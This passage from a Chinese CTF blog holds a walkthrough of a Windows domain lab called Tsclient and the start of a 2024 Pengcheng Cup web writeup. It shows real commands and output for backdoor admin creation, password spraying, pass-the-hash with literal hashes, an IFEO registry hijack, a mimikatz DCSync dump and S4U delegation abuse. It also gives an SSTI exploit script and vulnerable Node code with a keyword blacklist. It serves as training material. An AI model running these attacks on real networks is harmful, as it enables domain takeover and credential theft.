class="hljs-number">172.22.8.18:1433</span> open<span class="hljs-number">172.22.8.15:445</span> open<span class="hljs-number">172.22.8.15:135</span> open<span class="hljs-number">172.22.8.31:135</span> open<span class="hljs-number">172.22.8.18:135</span> open<span class="hljs-number">172.22.8.46:80</span> open<span class="hljs-number">172.22.8.31:445</span> open<span class="hljs-number">172.22.8.18:80</span> open<span class="hljs-number">172.22.8.18:445</span> open<span class="hljs-number">172.22.8.15:88</span> open<span class="hljs-number">172.22.8.46:139</span> open<span class="hljs-number">172.22.8.18:139</span> open<span class="hljs-number">172.22.8.15:139</span> open<span class="hljs-number">172.22.8.31:139</span> open<span class="hljs-number">172.22.8.46:135</span> open<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">16</span>start vulscan<span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>   <span class="hljs-string">[-&gt;]</span>WIN19-CLIENT   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span><span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>   <span class="hljs-string">[-&gt;]</span>WIN2016   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span><span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span>   <span class="hljs-string">[-&gt;]</span>DC01   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>     XIAORANG\WIN19-CLIENT<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>   <span class="hljs-string">[-&gt;]</span>WIN-WEB   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">2001</span>:<span class="hljs-number">0</span>:348b:fb58:<span class="hljs-number">1040</span>:23f4:d89d:8c02<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span>     <span class="hljs-string">[+]</span>DC XIAORANG\DC01<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>     WIN2016.xiaorang.lab                Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<span class="hljs-string">[+]</span> mssql:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>:<span class="hljs-number">1433</span>:sa 1qaz!QAZ</code></pre></div><p>一共四个机子</p><div class="code-wrapper"><pre><code class="hljs shell">172.22.8.15 XIAORANG\DC01 # 域控172.22.8.31 XIAORANG\WIN19-CLIENT172.22.8.46 WIN2016.xiaorang.lab172.22.8.18 WIN-WEB # 本机</code></pre></div><p>根据flag01后面的提示，关注用户会话</p><p>创建一个管理员账户RDP过去查看一下用户会话有什么</p><div class="code-wrapper"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> zeropeach whoami<span class="hljs-variable">@666</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>net localgroup administrators zeropeach <span class="hljs-operator">/</span><span class="hljs-keyword">add</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128014935798.png" alt="image-20241128014935798"></p><div class="code-wrapper"><pre><code class="hljs crmsh">query <span class="hljs-keyword">user</span><span class="hljs-title">query</span> sessionquser || qwinst</code></pre></div><p>都可以发现john用户正在被rdp</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128015130405.png" alt="image-20241128015130405"></p><p>是被内网的 <code>172.22.8.31 XIAORANG\WIN19-CLIENT</code> 上连过来的</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128015205523.png" alt="image-20241128015205523"></p><p>看X1r0z大佬的wp</p><p><a href="https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg">利用 mstsc 反向攻击思路整理 (qq.com)</a></p><p>tsclient 是通过远程桌面连接到远程计算机时，在远程计算机“网上邻居”中出现的一个机器名</p><p>通过<code>\\tsclient\盘符</code>可以在远程计算机上访问本机</p><p>只有特定用户才能访问，所以我们需要模拟john用户，去访问共享文件夹</p><h3 id="模拟方式一"><a href="#模拟方式一" class="headerlink" title="模拟方式一"></a>模拟方式一</h3><p>X1r0z大佬提到</p><blockquote><p>无论使用 cs 自带的 make token 还是 msf 的 incognito, 还是 SharpToken, 执行 <code>dir \\tsclient\c</code> 都显示拒绝访问, 很怪</p></blockquote><p>确实是这样的，我使用msf的incognito</p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">load</span> incognito<span class="hljs-comment">#查看当前目标主机的域环境信息</span>list_tokens -u<span class="hljs-comment">#模拟令牌</span>impersonate_token <span class="hljs-string">&#x27;WIN-WEB\John&#x27;</span></code></pre></div><p>之后就什么命令都用不了了</p><p>解决方法是psexec连过去再上线msf</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> psexec.py -hashes :<span class="hljs-number">2</span>caf35bb4c5059a3d50599844e2b9b1f administrator@<span class="hljs-number">172.22.8.18</span></code></pre></div><p>使用上面的操作即可模拟john用户</p><h3 id="模拟方式二"><a href="#模拟方式二" class="headerlink" title="模拟方式二"></a>模拟方式二</h3><p>可以使用cs，cs能够进程注入john用户</p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>shell执行whoami发现是<code>WIN-WEB\John</code>就成功了</p><p>然后就可以<code>dir \\tsclient\c</code>访问了</p><p>发现txt文件</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128020837467.png" alt="image-20241128020837467"></p><p>有用户名和密码，进行密码喷洒</p><p>我使用的是win版的crackmapexec，不能输入smb，否则用法不对，而且结果好像和别人的有些不同</p><div class="code-wrapper"><pre><code class="hljs pgsql">D:\CTF-tool\shentou\crackmapexec&gt;crackmapexec -u Aldrich -p &quot;Ald@rLMWuy7Z!#&quot; -d xiaorang.lab <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>/<span class="hljs-number">24</span><span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">05</span> [*] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">445</span> <span class="hljs-keyword">is</span> running Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">20348</span> (<span class="hljs-type">name</span>:DC01) (<span class="hljs-keyword">domain</span>:xiaorang.lab)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">05</span> [*] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.31</span>:<span class="hljs-number">445</span> <span class="hljs-keyword">is</span> running Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:WIN19-CLIENT) (<span class="hljs-keyword">domain</span>:xiaorang.lab)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [*] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>:<span class="hljs-number">445</span> <span class="hljs-keyword">is</span> running Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">14393</span> (<span class="hljs-type">name</span>:WIN-WEB) (<span class="hljs-keyword">domain</span>:xiaorang.lab)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [*] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.46</span>:<span class="hljs-number">445</span> <span class="hljs-keyword">is</span> running Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">14393</span> (<span class="hljs-type">name</span>:WIN2016) (<span class="hljs-keyword">domain</span>:xiaorang.lab)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [-] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span>:<span class="hljs-number">445</span> xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# SMB SessionError: STATUS_PASSWORD_EXPIRED(The <span class="hljs-keyword">user</span> account <span class="hljs-keyword">password</span> has expired.)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [-] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.31</span>:<span class="hljs-number">445</span> NetBIOS Error: (<span class="hljs-string">&#x27;Error while reading from remote&#x27;</span>, <span class="hljs-number">255</span>, <span class="hljs-keyword">None</span>)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [-] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>:<span class="hljs-number">445</span> NetBIOS Error: (<span class="hljs-string">&#x27;Error while reading from remote&#x27;</span>, <span class="hljs-number">255</span>, <span class="hljs-keyword">None</span>)<span class="hljs-number">11</span><span class="hljs-number">-27</span><span class="hljs-number">-2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">31</span>:<span class="hljs-number">06</span> [-] <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.46</span>:<span class="hljs-number">445</span> NetBIOS Error: (<span class="hljs-string">&#x27;Error while reading from remote&#x27;</span>, <span class="hljs-number">255</span>, <span class="hljs-keyword">None</span>)</code></pre></div><p>别人的三台机子都是<code>STATUS_PASSWORD_EXPIRED</code>，提示密码过期</p><h3 id="密码修改方式一"><a href="#密码修改方式一" class="headerlink" title="密码修改方式一"></a>密码修改方式一</h3><p>使用rdesktop，能够点击进行更改</p><h3 id="密码修改方式二"><a href="#密码修改方式二" class="headerlink" title="密码修改方式二"></a>密码修改方式二</h3><p>使用smbpasswd.py</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> smbpasswd.py xiaorang.lab/Aldrich:<span class="hljs-string">&quot;Ald<span class="hljs-variable">@rLMWuy7Z</span>!#&quot;</span>@<span class="hljs-number">172.22.8.15</span> -newpass <span class="hljs-string">&#x27;csy666zz!&#x27;</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128022031081.png" alt="image-20241128022031081"></p><h3 id="继续-1"><a href="#继续-1" class="headerlink" title="继续"></a>继续</h3><p>修改密码后，只能够rdp登录172.22.8.46，其他的不在Remote Desktop Users 用户组内</p><p>然后就可以做一下bloodhound信息收集</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128022309005.png" alt="image-20241128022309005"></p><p>然后考虑一下提权，在共享文件夹的txt中提到提示</p><p><code>Do you know how to hijack Image?</code></p><p>可以知道是IFEO劫持</p><p>使用powershell执行命令</p><div class="code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-acl</span> -<span class="hljs-string">path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="hljs-string">fl</span> *</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128022709399.png" alt="image-20241128022709399"></p><p>发现NT AUTHORITY\Authenticated Users可以修改注册表<br>即所有账号密码登录的用户都可以修改注册表，利用这个性质，修改注册表，使用放大镜进行提权!</p><div class="code-wrapper"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span></span></code></pre></div><p>其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128022903651.png" alt="image-20241128022903651"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>根据bloodhound信息收集的结果，发现WIN2016$为域管用户，后面就要用WIN2016$去dump域管哈希了</p><p>别人都是用CS的shell自带mimikatz</p><p>我想要上传文件可以利用上面的tsclient，</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128023505772.png" alt="image-20241128023505772"></p><p>然后机子就能访问想要共享的磁盘了</p><p>把文件复制出来</p><p>使用上面system权限的cmd来执行</p><div class="code-wrapper"><pre><code class="hljs shell">mimikatz<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">log</span></span><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">privilege::debug</span><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">lsadump::dcsync /domain /all /csv</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128023944712.png" alt="image-20241128023944712"></p><p>然后pass the hash即可</p><div class="code-wrapper"><pre><code class="hljs llvm">python psexec.py -hashes :<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">81</span>bdcf<span class="hljs-number">3</span>ec<span class="hljs-number">8</span>b<span class="hljs-number">1</span>def<span class="hljs-number">10328</span>a<span class="hljs-number">7</span><span class="hljs-keyword">cc</span><span class="hljs-number">2</span>f<span class="hljs-number">08</span> xiaorang.lab/administrator<span class="hljs-title">@172</span>.<span class="hljs-number">22.8</span>.<span class="hljs-number">15</span> -codec gbk</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128024048620.png" alt="image-20241128024048620"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>X1r0z大佬提到查询域委派</p><p>查询域委派关系</p><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">proxychains findDelegation.py xiaorang.lab/Aldrich:<span class="hljs-string">&#x27;P@ssw0rd&#x27;</span> -dc-ip 172.22.8.15 -target-domain xiaorang.lab</span>Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 FortraAccountName    AccountType  DelegationType                      DelegationRightsTo-------------  -----------  ----------------------------------  --------------------------------------------------<span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/xiaorang.lab</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/XIAORANG</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01/XIAORANG</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/DomainDnsZones.xiaorang.lab</span><span class="hljs-meta prompt_">WIN2016$ </span><span class="language-bash">      Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/ForestDnsZones.xiaorang.lab</span><span class="hljs-meta prompt_">WIN19-CLIENT$ </span><span class="language-bash"> Computer     Constrained w/ Protocol Transition  cifs/WIN2016.xiaorang.lab</span><span class="hljs-meta prompt_">WIN19-CLIENT$ </span><span class="language-bash"> Computer     Constrained w/ Protocol Transition  cifs/WIN2016</span></code></pre></div><p>存在从 <code>WIN2016$</code> 到 <code>DC01</code> 的约束委派, 并且委派的是 LDAP 服务</p><p>利用 S4U 协议请求 ST 伪造 Administrator 用户</p><div class="code-wrapper"><pre><code class="hljs stylus">proxychains getST<span class="hljs-selector-class">.py</span> xiaorang.lab/WIN2016\$ -hashes :<span class="hljs-number">02</span>b2a436556a3dd5d6638ad03f87c43e -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">8.15</span> -spn ldap/DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate administrator</code></pre></div><p><em>本来的思路是想利用票据进行 DCSync 导出域管 Hash 之后再去 psexec 的 (因为委派的是 LDAP 服务),</em></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>开了三次机子，每一次都是因为工具问题或者是代理问题导致耗了很长时间，没沙砾了。。。。</p><p>这里感谢unknown师傅的沙砾支持，嘻嘻 : (</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024 鹏城杯 web writeup</title>
    <link href="/2024/11/11/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/"/>
    <url>/2024/11/11/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-鹏城杯-web-writeup"><a href="#2024-鹏城杯-web-writeup" class="headerlink" title="2024 鹏城杯 web writeup"></a>2024 鹏城杯 web writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年的鹏城杯，在赛后看到TEL师傅的博客</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111040050507.png" alt="image-20241111040050507"></p><p>当时就在想，我一年后会不会也变厉害</p><p>而现如今</p><p>去年的鹏城杯，鄙人只做出来1题</p><p>今年的鹏城杯，鄙人和队友一起AK了web 6&#x2F;6</p><p>但是不得不吐槽一下平台，除了中间两三个小时，其他时间平台都崩掉了</p><h2 id="python口算"><a href="#python口算" class="headerlink" title="python口算"></a>python口算</h2><p>每秒都会更新表达式，使用python算出来后可以得到一个路径</p><p><code>static/f4dd790b-bc4e-48de-b717-903d433c597f</code></p><p>是一段python代码</p><div class="code-wrapper"><pre><code class="hljs routeros">@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def index(<span class="hljs-attribute">solved</span>=0):    global current_expr    # 前端计算    <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.    <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.    # 通过计算    username = <span class="hljs-string">&#x27;ctfer!&#x27;</span>    <span class="hljs-keyword">if</span> request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>):        username = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>)        <span class="hljs-keyword">if</span> whitelist_filter(username,whitelist_patterns):            <span class="hljs-keyword">if</span> blacklist_filter(username):                return render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)            <span class="hljs-keyword">else</span>:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你过关！&quot;</span>)        <span class="hljs-keyword">else</span>:            return render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">username</span>=username, <span class="hljs-attribute">hint</span>=<span class="hljs-string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</code></pre></div><p>试了很久GET请求啥都没有，后来队友发现实际是post</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;http://192.168.18.28&#x27;</span>res1 = requests.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/calc&#x27;</span>)ans = <span class="hljs-built_in">eval</span>(res1.text)data = &#123;    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;</span>&#125;res2 = requests.post(url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/?answer=<span class="hljs-subst">&#123;ans&#125;</span>&#x27;</span>, data=data)<span class="hljs-built_in">print</span>(res2.text)</code></pre></div><h2 id="notadmin"><a href="#notadmin" class="headerlink" title="notadmin"></a>notadmin</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<span class="hljs-keyword">let</span> &#123; <span class="hljs-title class_">User</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./user&#x27;</span>);<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>;app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<span class="hljs-keyword">const</span> tmp_user = &#123;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">authenticateToken</span>(<span class="hljs-params">req, res, next</span>) &#123;    <span class="hljs-keyword">const</span> authHeader = req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;authorization&#x27;</span>];    <span class="hljs-keyword">const</span> token = authHeader;    <span class="hljs-keyword">if</span> (tmp_user.<span class="hljs-property">secretKey</span> == <span class="hljs-literal">undefined</span>) &#123;        tmp_user.<span class="hljs-property">secretKey</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);    &#125;    <span class="hljs-keyword">if</span> (!token) &#123;        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);    &#125;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, tmp_user.<span class="hljs-property">secretKey</span>);        req.<span class="hljs-property">user</span> = decoded;        <span class="hljs-title function_">next</span>();    &#125; <span class="hljs-keyword">catch</span> (ex) &#123;        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid token.&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> c <span class="hljs-keyword">in</span> b) &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(b[c]));        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">check</span>(b[c])) &#123;            <span class="hljs-keyword">if</span> (a.<span class="hljs-title function_">hasOwnProperty</span>(c) &amp;&amp; b.<span class="hljs-title function_">hasOwnProperty</span>(c) &amp;&amp; <span class="hljs-keyword">typeof</span> a[c] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> b[c] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;                <span class="hljs-title function_">merge</span>(a[c], b[c]);            &#125; <span class="hljs-keyword">else</span> &#123;                a[c] = b[c];            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>        &#125;    &#125;    <span class="hljs-keyword">return</span> a&#125;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp_user.<span class="hljs-property">secretKey</span>)<span class="hljs-keyword">var</span> check = <span class="hljs-keyword">function</span> (<span class="hljs-params">str</span>) &#123;    <span class="hljs-keyword">let</span> input = <span class="hljs-regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/ig</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> str === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; str !== <span class="hljs-literal">null</span>) &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> str) &#123;            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">check</span>(key)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">check</span>(str[key])) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> !input.<span class="hljs-title function_">test</span>(str);    &#125;&#125;;app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>)&#125;);app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">merge</span>(tmp_user, req.<span class="hljs-property">body</span>)) &#123;        <span class="hljs-keyword">if</span> (tmp_user.<span class="hljs-property">secretKey</span> == <span class="hljs-literal">undefined</span>) &#123;            tmp_user.<span class="hljs-property">secretKey</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">User</span>.<span class="hljs-title function_">verifyLogin</span>(tmp_user.<span class="hljs-property">password</span>)) &#123;            <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">username</span>: tmp_user.<span class="hljs-property">username</span> &#125;, tmp_user.<span class="hljs-property">secretKey</span>);            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Login successful! Token: <span class="hljs-subst">$&#123;token&#125;</span>\nBut nothing happend~`</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login failed!&#x27;</span>);        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span 